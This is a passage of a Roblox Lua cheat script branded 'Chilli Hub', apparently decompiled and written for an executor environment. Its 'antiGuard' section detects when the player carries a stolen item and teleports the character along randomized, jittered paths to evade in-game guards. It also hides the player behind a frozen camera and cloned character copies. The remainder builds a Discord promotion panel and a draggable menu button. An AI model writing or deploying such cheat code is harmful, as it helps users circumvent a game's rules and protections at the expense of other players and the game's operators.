			if descendant:IsA("GuiButton") and descendant.Visible and descendant.AbsoluteSize.Y > 8 and descendant.AbsoluteSize.X > 8 then
				local y = descendant.AbsolutePosition.Y

				if not v10 or y < v10 then
					v10 = y
				end
			end
		end

		return v10 or arg.AbsolutePosition.Y
	end

	local function fn20()
		table.clear(tbl13)
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		if not playerGui then
			return
		end

		for _, descendant in ipairs(playerGui:GetDescendants()) do
			if descendant:IsA("GuiObject") and tbl12[descendant.Name] then
				tbl13[#tbl13 + 1] = descendant
			end
		end
	end

	local function fn21()
		local tbl14 = {}

		pcall(function()
			if not StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Backpack) then
				return
			end

			for _, child in ipairs(CoreGui.RobloxGui.Backpack:GetChildren()) do
				if child:IsA("GuiObject") then
					tbl14[#tbl14 + 1] = child
				end
			end
		end)

		for _, v10 in ipairs(tbl13) do
			if v10.Parent then
				tbl14[#tbl14 + 1] = v10
			end
		end

		return tbl14
	end

	local function fn22()
		local currentCamera = workspace.CurrentCamera
		if not currentCamera then
			return
		end
		local viewportSize = currentCamera.ViewportSize
		if viewportSize.X < 10 or viewportSize.Y < 10 then
			return
		end
		local flag2 = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
		local n5 = math.min(viewportSize.X / 1280, viewportSize.Y / 720)
		local scale = flag2 and math.clamp(n5 * 1.05, 0.6, 0.8) * 0.97 or math.clamp(n5, 0.8, 1.1)
		UIScale2.Scale = scale
		local backgroundTransparency = flag2 and 0.3 or 0

		if Frame2.BackgroundTransparency ~= backgroundTransparency then
			Frame2.BackgroundTransparency = backgroundTransparency
			Frame3.BackgroundTransparency = backgroundTransparency
		end

		local n6 = viewportSize.Y - 8 * scale
		local flag3 = false

		for _, v10 in ipairs(fn21()) do
			local ok, result = pcall(fn17, v10)

			if ok and result then
				local absoluteSize = v10.AbsoluteSize
				local y = v10.AbsolutePosition.Y

				if absoluteSize.X > 20 and absoluteSize.Y > 20 and absoluteSize.Y < viewportSize.Y * 0.4 and y + absoluteSize.Y / 2 > viewportSize.Y * 0.5 then
					local ok2, result2 = pcall(fn19, v10)
					y = ok2 and result2 or y
					flag3 = true
					n6 = math.min(n6, y + fn18(v10))
				end
			end
		end

		if flag3 then
			n4 = viewportSize.Y - n6
		elseif n4 then
			n6 = viewportSize.Y - n4
		end

		local n7 = math.max(n6 - (flag2 and 4 or 6) * scale - n3 * scale / 2, n3 * scale / 2 + 8)
		Frame.Position = UDim2.new(0.5, 0, 0, n7)
	end

	tbl10[#tbl10 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
		fn15()
		huge += deltaTime
		huge2 += deltaTime

		if huge >= 3 then
			huge = 0
			pcall(fn20)
		end

		if huge2 >= 0.2 then
			huge2 = 0
			pcall(fn22)
		end

		if antiGuard.Enabled then
			rotation = (rotation + deltaTime * (tbl11.Active and 360 or 90)) % 360
			UIGradient.Rotation = rotation
		end
	end)

	render(true)
end

antiGuard.ShowPanel = function(arg)
	ScreenGui.Enabled = arg == true
end

ScreenGui.Enabled = antiGuard.PanelShown == true
ScreenGui.Parent = hui
fn10(UIScale, 0.45, { Scale = 1 }, Enum.EasingStyle.Back)

do
	local function fn12()
		local v10 = tbl4.Root()
		if not v10 then
			return nil
		end

		for _, child in ipairs(workspace:GetChildren()) do
			if child:IsA("Model") and child:FindFirstChild("Hitbox") then
				for _, descendant in ipairs(child:GetDescendants()) do
					if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
						local ok, result, result2 = pcall(function()
							return descendant.Part0, descendant.Part1
						end)

						if ok and (result == v10 or result2 == v10) then
							return child
						end
					end
				end
			end
		end

		return nil
	end

	local function fn13(arg, parent)
		local tbl12 = {}

		for _, descendant in ipairs(arg:GetDescendants()) do
			tbl12[descendant] = descendant.Archivable

			pcall(function()
				descendant.Archivable = true
			end)
		end

		local archivable = arg.Archivable
		arg.Archivable = true

		local ok, result = pcall(function()
			return arg:Clone()
		end)

		arg.Archivable = archivable

		for k, v10 in pairs(tbl12) do
			pcall(function()
				k.Archivable = v10
			end)
		end

		if not ok or not result then
			return nil
		end
		result.Name = fn9()

		for _, descendant in ipairs(result:GetDescendants()) do
			if descendant:IsA("LuaSourceContainer") or descendant:IsA("Sound") or descendant:IsA("ForceField") or descendant:IsA("JointInstance") or descendant:IsA("Constraint") or descendant:IsA("WeldConstraint") or descendant:IsA("BodyMover") or descendant:IsA("ProximityPrompt") or descendant:IsA("BillboardGui") then
				pcall(function()
					descendant:Destroy()
				end)
			elseif descendant:IsA("BasePart") then
				descendant.Anchored = true
				descendant.CanCollide = false
				descendant.CanQuery = false
				descendant.CanTouch = false
			elseif descendant:IsA("Humanoid") then
				descendant.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
				descendant.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
			end
		end

		result.Parent = parent
		return result
	end

	local function fn14(arg, arg2)
		local currentCamera = workspace.CurrentCamera
		if not arg or not currentCamera or tbl11.Disguise then
			return
		end
		arg2 = arg2 or Vector3.zero
		local disguise = { Camera = currentCamera, CameraType = currentCamera.CameraType, CameraCFrame = currentCamera.CFrame, Copies = {}, Hidden = {} }
		tbl11.Disguise = disguise
		local tbl12 = { arg }
		local ok, result = pcall(fn12)

		if ok and result then
			tbl12[#tbl12 + 1] = result
		end

		for _, v10 in ipairs(tbl12) do
			for _, descendant in ipairs(v10:GetDescendants()) do
				if descendant:IsA("BasePart") or descendant:IsA("Decal") or descendant:IsA("Texture") then
					disguise.Hidden[#disguise.Hidden + 1] = descendant
				end
			end
		end

		local function fn15()
			for _, v10 in ipairs(disguise.Hidden) do
				pcall(function()
					v10.LocalTransparencyModifier = 1
				end)
			end

			pcall(function()
				if currentCamera.CameraType ~= Enum.CameraType.Scriptable then
					currentCamera.CameraType = Enum.CameraType.Scriptable
				end

				currentCamera.CFrame = disguise.CameraCFrame
			end)
		end

		fn15()
		disguise.BindName = fn9()

		if not pcall(function()
			RunService:BindToRenderStep(disguise.BindName, Enum.RenderPriority.Last.Value + 1, fn15)
		end) then
			disguise.BindName = nil
			disguise.Link = RunService.RenderStepped:Connect(fn15)
		end

		disguise.Beat = RunService.Heartbeat:Connect(fn15)

		for _, v10 in ipairs(tbl12) do
			local ok2, result2 = pcall(fn13, v10, currentCamera)

			if ok2 and result2 then
				if arg2.Magnitude > 0.01 then
					for _, descendant in ipairs(result2:GetDescendants()) do
						if descendant:IsA("BasePart") then
							pcall(function()
								descendant.CFrame = descendant.CFrame + arg2
							end)
						end
					end
				end

				disguise.Copies[#disguise.Copies + 1] = result2
			end
		end
	end

	local function fn15()
		local disguise = tbl11.Disguise
		if not disguise then
			return
		end
		tbl11.Disguise = nil

		if disguise.BindName then
			pcall(function()
				RunService:UnbindFromRenderStep(disguise.BindName)
			end)
		end

		if disguise.Link then
			pcall(function()
				disguise.Link:Disconnect()
			end)
		end

		if disguise.Beat then
			pcall(function()
				disguise.Beat:Disconnect()
			end)
		end

		for _, v10 in ipairs(disguise.Hidden) do
			pcall(function()
				v10.LocalTransparencyModifier = 0
			end)
		end

		pcall(function()
			disguise.Camera.CameraType = disguise.CameraType
		end)

		for _, copy in ipairs(disguise.Copies) do
			pcall(function()
				copy:Destroy()
			end)
		end
	end

	local function fn16()
		for _, v10 in ipairs(tbl9) do
			local v11 = workspace

			for _, v12 in ipairs(v10.Path) do
				v11 = v11 and v11:FindFirstChild(v12) or nil
			end

			if v11 and v11:IsA("BasePart") then
				return v11.CFrame:PointToWorldSpace(v10.Offset)
			end
		end

		return Vector3.new(528.7, 70.57, -364.11)
	end

	local function fn17(arg, arg2, arg3, arg4, arg5)
		local cFrame = CFrame.new(arg3) * arg4

		pcall(function()
			arg:PivotTo(cFrame)
		end)

		if (arg2.Position - arg3).Magnitude > 3 then
			pcall(function()
				arg2.CFrame = cFrame
			end)
		end

		if arg5 == false then
			return
		end

		for _, descendant in ipairs(arg:GetDescendants()) do
			if descendant:IsA("BasePart") then
				pcall(function()
					descendant.AssemblyLinearVelocity = Vector3.zero
					descendant.AssemblyAngularVelocity = Vector3.zero
				end)
			end
		end
	end

	local function fn18()
		local areaId = tbl11.AreaId

		if type(areaId) ~= "string" or areaId == "" then
			areaId = type(tbl4.Steal) == "table" and tbl4.Steal.CarryAreaId or nil
		end

		if type(areaId) ~= "string" or areaId == "" then
			areaId = localPlayer:GetAttribute("AreaId")
			areaId = type(areaId) == "string" and areaId or nil
		end

		return areaId
	end

	local tbl12 = { lightdark = "LightDark" }

	local function fn19(arg)
		if type(arg) ~= "string" then
			return "Default"
		end
		local lower = string.lower
		local v10 = string.gsub(arg, "[^%a]", "")
		return tbl12[lower(v10)] or "Default"
	end

	local function fn20()
		local ok, result = pcall(function()
			return getgenv().ChilliAntiGuard
		end)

		if ok and type(result) == "table" then
			if type(result.Steps) == "table" then
				return result
			end
			local default = result[fn19(fn18())] or result.Default
			if type(default) == "table" then
				return default
			end
		end

		return chilliAntiGuard[fn19(fn18())] or tbl7
	end

	local function fn21(arg, arg2)
		local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
		world = world and world:FindFirstChild("Areas")
		world = world and world:FindFirstChild("SeparationLine")

		if world and world:IsA("BasePart") then
			local cFrame = world.CFrame
			local v10 = (Vector3.new(0, 1, 0)):Cross(world.Size.X >= world.Size.Z and cFrame.RightVector or cFrame.LookVector)
			local vector = Vector3.new(v10.X, 0, v10.Z)

			if vector.Magnitude > 0.001 then
				local unit = vector.Unit
				local n4 = cFrame.Position + ((arg2 - cFrame.Position):Dot(unit) >= 0 and -unit or unit) * (tonumber(arg.LineOffset) or 8)
				return Vector3.new(n4.X, arg2.Y + 0.5, n4.Z)
			end
		end

		return nil
	end

	local function fn22(arg, arg2)
		local str = tostring(arg.Target or "home")
		if str == "sky" then
			return arg2
		end

		if str == "point" then
			if typeof(arg.Point) == "Vector3" then
				return arg.Point
			end
			return arg2
		end

		if str == "line" then
			local v10 = fn21(arg, arg2)
			if v10 then
				return v10
			end
		end

		return fn16()
	end

	local function fn23(arg, arg2)
		return fn22(arg, arg2) + Vector3.new(tonumber(arg.OffsetX) or 0, tonumber(arg.Height) or 0, tonumber(arg.OffsetZ) or 0)
	end

	local function fn24()
		tbl11.Active = false
		antiGuard.Busy = false
	end

	local function fn25(arg)
		local n4 = math.max(tonumber(arg) or 0, 0)
		if n4 <= 0 then
			return 0
		end
		return (math.random() * 2 - 1) * n4
	end

	local function fn26(arg)
		local steps = type(arg.Steps) == "table" and arg.Steps or {}
		local n4 = tonumber(arg.ReleaseAt) or 0
		local n5 = math.max(tonumber(arg.StartAt) or 0, 0)
		local n6 = math.max(tonumber(arg.StartRandom) or 0, 0)
		local n7 = math.max(tonumber(arg.HopRandom) or 0, 0)
		local n8 = math.max(tonumber(arg.HoldRandom) or 0, 0)
		if n6 <= 0 and n7 <= 0 and n8 <= 0 then
			return steps, n4, n5
		end
		local n9 = math.max(n5 + fn25(n6), 0)
		local tbl13 = {}
		local v10, v11, v12 = ipairs(steps)
		local n10 = 0
		local n11 = 0

		for k, v13 in v10, v11, v12 do
			if type(v13) == "table" then
				local n12 = math.max(tonumber(v13.At) or 0, 0)
				n11 = math.max(n11 + math.max(n12 - n10, 0) + fn25(v13.To == "start" and n8 or n7), n9)
				tbl13[k] = { At = n11, To = v13.To, Glide = v13.Glide }
				n10 = n12
				continue
			end

			break
		end

		return tbl13, n11 + math.max(n4 - n10, 0), n9
	end

	local function fn27(arg)
		local character = localPlayer.Character
		local v10 = tbl4.Root()
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")

		if not v10 or not humanoid or humanoid.Health <= 0 then
			fn24()
			fn11(tbl8.Bad, 1.6)
			return
		end

		local function fn28()
			return flag and v10.Parent ~= nil and humanoid.Parent ~= nil and humanoid.Health > 0
		end

		local platformStand = humanoid.PlatformStand
		local cFrame = v10.CFrame
		local position = cFrame.Position
		local v11 = fn20()
		local v12, v13, v14 = fn26(v11)
		local flag2 = v11.Freeze ~= false
		local str = tostring(v11.Facing or "Keep")
		local n4 = math.max(tonumber(v11.Jitter) or 0, 0)
		local cframe = str == "Zero" and CFrame.new() or cFrame.Rotation

		local function fn29()
			if str == "Spin" then
				return CFrame.Angles(0, math.rad(math.random(0, 359)), 0)
			end
			return cframe
		end

		local function fn30(arg2)
			if n4 <= 0 then
				return arg2
			end
			return arg2 + Vector3.new((math.random() * 2 - 1) * n4, 0, (math.random() * 2 - 1) * n4)
		end

		local v15 = fn23(v11, position)

		local function fn31(arg2)
			while fn28() and os.clock() - arg < arg2 do
				RunService.Heartbeat:Wait()

				if flag2 then
					pcall(function()
						v10.AssemblyLinearVelocity = Vector3.zero
						v10.AssemblyAngularVelocity = Vector3.zero
					end)
				end
			end

			return fn28()
		end

		local function fn32(arg2, arg3)
			fn17(character, v10, arg2, arg3, flag2)
			RunService.PreSimulation:Wait()

			if fn28() and (v10.Position - arg2).Magnitude > 3 then
				fn17(character, v10, arg2, arg3, flag2)
			end
		end

		pcall(function()
			humanoid.BreakJointsOnDeath = false
		end)

		if v11.Disguise ~= false then
			pcall(fn14, character, Vector3.zero)
		end

		fn11(tbl8.Work)

		if fn31(v14) and v11.Limp ~= false then
			humanoid.PlatformStand = true
		end

		local v16 = position

		for _, v17 in ipairs(v12) do
			local flag3 = type(v17) ~= "table"
			local flag4

			if flag3 then
				flag4 = flag3
			else
				flag4 = not fn31(tonumber(v17.At) or 0)
			end

			if not flag4 then
				local flag5 = v17.To == "start" and position or fn30(v15)
				local v18 = fn29()

				if type(v17.Glide) == "table" and #v17.Glide > 0 then
					for _, v19 in ipairs(v17.Glide) do
						if fn28() then
							local n5 = math.clamp(tonumber(v19) or 1, 0, 1)
							fn17(character, v10, v16:Lerp(flag5, n5), v18, flag2)
							RunService.Heartbeat:Wait()
							continue
						end

						break
					end

					v16 = flag5
				else
					fn32(flag5, v18)
					v16 = flag5
				end

				continue
			end

			break
		end

		fn31(v13)

		pcall(function()
			humanoid.PlatformStand = platformStand
		end)

		fn15()
		fn24()

		if fn28() and tbl11.Carrying then
			fn11(tbl8.Good, 1.6)
		else
			fn11(tbl8.Bad, 1.6)
		end
	end

	local function fn28(arg)
		if not pcall(fn27, arg) then
			pcall(function()
				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")

				if character then
					character.PlatformStand = false
				end
			end)

			fn15()
			fn24()
			fn11(tbl8.Bad, 1.6)
		end
	end

	local n4 = 25

	local function fn29()
		if antiGuard.HitArms <= 0 then
			return false
		end

		if n4 < os.clock() - (antiGuard.HitArmedAt or 0) then
			antiGuard.HitArms = 0
			return false
		end
		return true
	end

	local function fn30()
		local carrying = tbl11.Carrying
		tbl11.Carrying = tbl11.SignalCarrying or tbl11.WeldCarrying

		if tbl11.Carrying and not carrying and flag and antiGuard.Enabled and not tbl11.Active and not fn29() then
			tbl11.Active = true
			antiGuard.Busy = true
			antiGuard.BusySince = os.clock()
			task.spawn(fn28, os.clock())
		end
	end

	local eggState = tbl.EggState
	local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

	if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
		local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
			local signalCarrying = type(arg) == "table" and arg.IsCarrying == true

			if signalCarrying and arg.GuardDisabled == true then
				signalCarrying = false
			end

			if signalCarrying and type(arg.AreaId) == "string" then
				tbl11.AreaId = arg.AreaId
			end

			if not signalCarrying then
				tbl11.AreaId = nil
			end

			tbl11.SignalCarrying = signalCarrying
			fn30()
		end)

		if ok and result then
			tbl10[#tbl10 + 1] = result
		end
	end

	local n5 = 0

	tbl10[#tbl10 + 1] = RunService.Heartbeat:Connect(function(deltaTime)
		local busy = antiGuard.Busy or tbl11.Active

		if busy then
			local busySince = antiGuard.BusySince
			busy = os.clock() - busySince > math.max(tonumber(fn20().BusyLimit) or tbl7.BusyLimit, (tonumber(fn20().ReleaseAt) or 0) + 1)
		end

		if busy then
			fn15()
			local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.PlatformStand then
				pcall(function()
					humanoid.PlatformStand = false
				end)
			end

			fn24()
		end

		fn29()
		n5 += deltaTime
		if n5 < tbl7.WeldScanGap then
			return
		end
		n5 = 0
		local weldCarrying = fn12() ~= nil

		if weldCarrying ~= tbl11.WeldCarrying then
			tbl11.WeldCarrying = weldCarrying
			fn30()
		end
	end)

	fn4(function()
		flag = false

		for _, v10 in ipairs(tbl10) do
			pcall(function()
				v10:Disconnect()
			end)
		end

		table.clear(tbl10)
		fn15()
		fn24()
		antiGuard.Render = nil
		antiGuard.ShowPanel = nil

		pcall(function()
			ScreenGui:Destroy()
		end)
	end)
end

do
	local v10 = v2:CreateTab({ Name = "Discord", Side = "Right", SectionsExpanded = true }):CreateSection({ Name = "Community", Expanded = true })
	local str = "discord.gg/CJK4bs2mgT"
	local str2 = "rbxassetid://128961717706452"
	local n4 = 0.5
	local n5 = 0.0909
	local n6 = 0.2
	local n7 = 5.4
	local n8 = 4.2
	local n9 = 5.2
	local n10 = 6
	local n11 = 3.6
	local n12 = 6.4
	local n13 = 2
	local n14 = 11.4
	local n15 = 3
	local n16 = 0.35

	local tbl12 = {
		{
			Color = "#FF6A55",
			Title = "New Scripts &amp; Updates",
			Text = "Patch notes and new game scripts are posted there first.",
		},
		{
			Color = "#FFB054",
			Title = "Giveaways",
			Text = "Member giveaways and events are announced in the server.",
		},
		{
			Color = "#9AA3FF",
			Title = "Support",
			Text = "Ask for help, report bugs and get answers from the team.",
		},
		{
			Color = "#6EE49C",
			Title = "Suggestions",
			Text = "Request features and vote on what gets added next.",
		},
	}

	local n17 = n14 + #tbl12 * (n15 + n16) + 2.4 + n6 * 2
	local colorSequence = ColorSequence.new
	local tbl13 = {}
	local v11 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 218, 96))
	local v12 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 152, 60))
	local new = ColorSequenceKeypoint.new
	local color2 = Color3.fromRGB
	tbl13[1] = v11
	tbl13[2] = v12

	do
		local values = table.pack(new(1, color2(255, 82, 64)))
		table.move(values, 1, values.n, 3, tbl13)
	end

	local v13 = colorSequence(tbl13)
	local color3 = Color3.fromRGB
	local colorSequence2 = ColorSequence.new(Color3.fromRGB(74, 24, 18), color3(14, 11, 15))
	local tbl14 = { Perks = {} }
	local n18 = 0

	local function fn12()
		local v14 = setclipboard or toclipboard
		local ok = type(v14) == "function" and pcall(v14, "https://discord.gg/CJK4bs2mgT") or false
		fn8(ok and "Discord Link Copied" or "Discord Link", "https://discord.gg/CJK4bs2mgT")
		if not tbl14.Copy then
			return
		end
		n18 += 1
		local v15 = n18

		tbl14.Copy.Set({
			Text = ok and "<b>Copied!</b>" or "<b>See Notice</b>",
			Background = ok and "#2EB070" or "#5865F2",
		})

		task.delay(1.8, function()
			if v15 == n18 and tbl14.Copy then
				tbl14.Copy.Set({ Text = "<b>Copy Link</b>", Background = "#5865F2" })
			end
		end)
	end

	local function fn13(arg)
		if not tbl14.Hero then
			return
		end
		local n19 = n6 * 2
		local n20 = math.max(arg, 14) - n19
		local n21 = math.max(1, n20 - n9 - n4)
		local n22 = math.max(1, n20 - n12 - n4 * 3)
		local n23 = math.max(1, n20 - 1.2)
		tbl14.Hero.Set({ Width = n20 })
		tbl14.Title.Set({ Width = n21 })
		tbl14.Subtitle.Set({ Width = n21 })
		tbl14.Members.Set({ Width = n21 })
		tbl14.Invite.Set({ Width = n20 })
		tbl14.Label.Set({ Width = n22 })
		tbl14.Link.Set({ Width = n22 })
		tbl14.Copy.Set({ X = n20 - n12 - n4 })
		tbl14.Header.Set({ Width = n20 })

		for _, perk in ipairs(tbl14.Perks) do
			perk.Frame.Set({ Width = n20 })
			perk.Title.Set({ Width = n23 })
			perk.Text.Set({ Width = n23 })
		end

		tbl14.Tip.Set({ Width = n20 })
	end

	local function fn14(arg)
		tbl14.Hero = arg:Frame({
			Name = "Hero",
			X = n6,
			Y = n6,
			Width = 14,
			Height = n7,
			Background = "#FFFFFF",
			Gradient = colorSequence2,
			GradientRotation = 0,
			Corner = 0.35,
			StrokeColor = "#FF6A40",
			StrokeThickness = n5,
			StrokeTransparency = 0.55,
		})

		tbl14.Logo = arg:Image({
			Parent = tbl14.Hero,
			X = 0.5,
			Y = (n7 - n8) / 2,
			Width = n8,
			Height = n8,
			Image = str2,
		})

		tbl14.Title = arg:Text({
			Parent = tbl14.Hero,
			X = n9,
			Y = 0.45,
			Width = 1,
			Height = 1.6,
			Scale = 1.45,
			Wrap = false,
			Text = "<b>Chilli Hub</b>",
			Gradient = v13,
			GradientRotation = 0,
			TextStrokeTransparency = 1,
		})

		tbl14.Subtitle = arg:Text({
			Parent = tbl14.Hero,
			X = n9,
			Y = 2.1,
			Width = 1,
			Height = 1,
			Wrap = false,
			Text = "Official Discord Community",
			Color = "#DCDCE8",
		})

		tbl14.Members = arg:Text({
			Parent = tbl14.Hero,
			X = n9,
			Y = 3.3,
			Width = 1,
			Height = 1.2,
			Wrap = false,
			Text = string.format("<font color=\"#6EE49C\">%s</font>  <b>%s</b>  <font color=\"#B8B8CC\">Members</font>", utf8.char(9679), "130K+"),
		})

		tbl14.Invite = arg:Frame({
			Name = "Invite",
			X = n6,
			Y = n10 + n6,
			Width = 14,
			Height = n11,
			Background = "#000000",
			BackgroundTransparency = 0.5,
			Corner = 0.35,
			StrokeColor = "#5865F2",
			StrokeThickness = n5,
			StrokeTransparency = 0.35,
		})

		tbl14.Label = arg:Text({
			Parent = tbl14.Invite,
			X = n4 + 0.1,
			Y = 0.35,
			Width = 1,
			Height = 0.9,
			Scale = 0.78,
			Wrap = false,
			Text = "<b>INVITE LINK</b>",
			Color = "#9C9CB4",
		})

		tbl14.Link = arg:Text({
			Parent = tbl14.Invite,
			X = n4 + 0.1,
			Y = 1.35,
			Width = 1,
			Height = 1.6,
			Scale = 1.05,
			Wrap = false,
			Font = "code",
			Text = str,
		})

		tbl14.Copy = arg:Button({
			Parent = tbl14.Invite,
			X = 14 - n12 - n4,
			Y = (n11 - n13) / 2,
			Width = n12,
			Height = n13,
			Text = "<b>Copy Link</b>",
			Color = "#FFFFFF",
			Scale = 1,
			Background = "#5865F2",
			BackgroundTransparency = 0,
			HoverTransparency = 0.15,
			PressTransparency = 0.3,
			StrokeColor = "#9AA3FF",
			StrokeThickness = n5,
			Corner = 0.3,
			Callback = fn12,
		})

		tbl14.Header = arg:Text({
			X = n6 + 0.1,
			Y = n14 - 1.15 + n6,
			Width = 14,
			Height = 1,
			Scale = 0.8,
			Wrap = false,
			Text = "<b>WHAT YOU GET</b>",
			Color = "#9C9CB4",
		})

		for i, v14 in ipairs(tbl12) do
			local tbl15 = {
				Frame = arg:Frame({
					Name = "Perk",
					X = n6,
					Y = n14 + (i - 1) * (n15 + n16) + n6,
					Width = 14,
					Height = n15,
					Background = "#000000",
					BackgroundTransparency = 0.68,
					Corner = 0.35,
				}),
			}

			tbl15.Accent = arg:Frame({
				Parent = tbl15.Frame,
				X = 0.3,
				Y = 0.45,
				Width = 0.22,
				Height = n15 - 0.9,
				Background = v14.Color,
				Corner = 0.11,
			})

			tbl15.Title = arg:Text({
				Parent = tbl15.Frame,
				X = 0.85,
				Y = 0.3,
				Width = 1,
				Height = 1.1,
				Wrap = false,
				Text = "<b>" .. v14.Title .. "</b>",
				Color = v14.Color,
			})

			tbl15.Text = arg:Text({
				Parent = tbl15.Frame,
				X = 0.85,
				Y = 1.35,
				Width = 1,
				Height = 1.5,
				Scale = 0.86,
				Wrap = true,
				Text = v14.Text,
				Color = "#C8C8D8",
			})

			tbl14.Perks[i] = tbl15
		end

		tbl14.Tip = arg:Text({
			X = n6 + 0.1,
			Y = n17 - 2.2 - n6,
			Width = 14,
			Height = 2,
			Scale = 0.8,
			Wrap = true,
			Text = "Paste the copied link into your browser or the Discord app to join.",
			Color = "#8A8AA2",
		})

		arg:SetContentLines(n17)

		arg:OnResize(function(arg2, arg3, arg4)
			fn13(arg3 / math.max(arg4, 1))
		end)

		local max = math.max
		fn13(arg:Width() / max(arg:Unit(), 1))
	end

	if type(v10.CreateCanvas) == "function" then
		local v14 = v10:CreateCanvas({
			Name = "Discord",
			ShowTitle = false,
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = math.ceil(n17),
				MaxLines = math.ceil(n17),
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = fn14,
		})

		fn4(function()
			v14:Destroy()
		end)
	else
		v10:CreateText({ Name = "Discord", Text = "https://discord.gg/CJK4bs2mgT" })
	end

	if type(v10.CreateButton) == "function" then
		v10:CreateButton({ Name = "Copy Discord Link", Callback = fn12 })
	end
end

do
	local image = "rbxassetid://128961717706452"
	local n4 = 56
	local n5 = 0.035
	local n6 = 8
	local tweenInfo = TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local tweenInfo2 = TweenInfo.new(0.14, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	local TweenService = game:GetService("TweenService")
	local tbl12 = {}
	local screenGui = nil
	local uiScale = nil
	local uiScale2 = nil

	local function fn12()
		for _, v10 in ipairs({ "Toggle", "Open" }) do
			local ok, result = pcall(function()
				return v2[v10]
			end)

			if ok and type(result) == "function" then
				pcall(result, v2)
				return
			end
		end
	end

	local function fn13()
		if not uiScale then
			return
		end
		local currentCamera = workspace.CurrentCamera
		local viewportSize = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if viewportSize.X < 1 then
			viewportSize = Vector2.new(1280, 720)
		end

		uiScale.Scale = math.clamp(viewportSize.X * n5 / n4, 0.7, 1.4)
	end

	local function fn14()
		for _, v10 in ipairs(tbl12) do
			pcall(function()
				v10:Disconnect()
			end)
		end

		table.clear(tbl12)

		if screenGui then
			pcall(function()
				screenGui:Destroy()
			end)
		end

		screenGui = nil
		uiScale = nil
		uiScale2 = nil
	end

	local function fn15()
		fn14()
		screenGui = Instance.new("ScreenGui")
		screenGui.Name = fn3()
		screenGui.Archivable = false
		screenGui.DisplayOrder = 59
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		local frame = Instance.new("Frame")
		frame.Name = fn3()
		frame.AnchorPoint = Vector2.new(0, 0.5)
		frame.Position = UDim2.new(0, 16, 0.3, 0)
		frame.Size = UDim2.fromOffset(56, 56)
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Parent = screenGui
		uiScale = Instance.new("UIScale")
		uiScale.Name = fn3()
		uiScale.Parent = frame
		fn13()
		local imageButton = Instance.new("ImageButton")
		imageButton.Name = fn3()
		imageButton.AnchorPoint = Vector2.new(0.5, 0.5)
		imageButton.Position = UDim2.fromScale(0.5, 0.5)
		imageButton.Size = UDim2.fromScale(1, 1)
		imageButton.BackgroundTransparency = 1
		imageButton.BorderSizePixel = 0
		imageButton.AutoButtonColor = false
		imageButton.Image = image
		imageButton.ScaleType = Enum.ScaleType.Fit
		imageButton.Active = true
		imageButton.Parent = frame
		uiScale2 = Instance.new("UIScale")
		uiScale2.Name = fn3()
		uiScale2.Parent = imageButton
		local uiCorner = Instance.new("UICorner")
		uiCorner.Name = fn3()
		uiCorner.CornerRadius = UDim.new(0.28, 0)
		uiCorner.Parent = imageButton

		local function fn16(arg, arg2)
			if uiScale2 then
				TweenService:Create(uiScale2, arg2, { Scale = arg }):Play()
			end
		end

		local function fn17(arg)
			local absoluteSize = screenGui.AbsoluteSize
			local absoluteSize2 = frame.AbsoluteSize
			if absoluteSize.X <= 0 or absoluteSize.Y <= 0 then
				return arg
			end
			local n7 = arg.Y.Offset + arg.Y.Scale * absoluteSize.Y
			local n8 = math.clamp(arg.X.Offset + arg.X.Scale * absoluteSize.X, 0, math.max(0, absoluteSize.X - absoluteSize2.X))
			local n9 = math.clamp(n7, absoluteSize2.Y * 0.5, math.max(absoluteSize2.Y * 0.5, absoluteSize.Y - absoluteSize2.Y * 0.5))
			return UDim2.fromOffset(n8, n9)
		end

		local str = nil
		local vector2 = nil
		local position = nil
		local flag2 = false
		local flag3 = false

		local function fn18(arg, arg2)
			if str == "mouse" then
				return arg.UserInputType == (arg2 and Enum.UserInputType.MouseMovement or Enum.UserInputType.MouseButton1)
			end
			return arg == str
		end

		tbl12[#tbl12 + 1] = imageButton.InputBegan:Connect(function(input)
			local flag4 = input.UserInputType == Enum.UserInputType.Touch
			if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag4 or input.UserInputState ~= Enum.UserInputState.Begin or str then
				return
			end
			str = flag4 and input or "mouse"
			vector2 = Vector2.new(input.Position.X, input.Position.Y)
			position = frame.Position
			flag2 = false
			flag3 = false
			fn16(0.9, tweenInfo)
		end)

		tbl12[#tbl12 + 1] = UserInputService.InputChanged:Connect(function(input)
			if not str or not fn18(input, true) then
				return
			end
			local n7 = Vector2.new(input.Position.X, input.Position.Y) - vector2

			if not flag2 then
				if n7.Magnitude < n6 then
					return
				end
				flag2 = true
				flag3 = true
				fn16(1, tweenInfo2)
			end

			frame.Position = fn17(UDim2.new(position.X.Scale, position.X.Offset + n7.X, position.Y.Scale, position.Y.Offset + n7.Y))
		end)

		tbl12[#tbl12 + 1] = UserInputService.InputEnded:Connect(function(input)
			if str and fn18(input, false) then
				str = nil
				flag2 = false
				fn16(1, tweenInfo2)
			end
		end)

